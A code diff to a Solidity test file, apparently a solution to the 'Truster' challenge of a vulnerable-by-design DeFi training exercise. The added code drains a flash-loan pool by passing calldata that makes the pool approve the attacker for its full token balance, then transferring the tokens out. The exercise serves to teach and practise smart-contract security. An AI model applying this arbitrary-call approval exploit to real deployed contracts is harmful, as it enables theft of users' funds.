@@ -39,8 +39,20 @@ contract Truster is DSTest {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
-    function testExploit() public {
+    function testTrusterExploit() public {
         /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));
+        bytes memory attackCallData = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            attacker,
+            poolBalance
+        );
+        trusterLenderPool.flashLoan(0, attacker, address(dvt), attackCallData);
+
+        dvt.transferFrom(address(trusterLenderPool), attacker, poolBalance);
+
+        vm.stopPrank();
 
         /** EXPLOIT END **/
         validation();
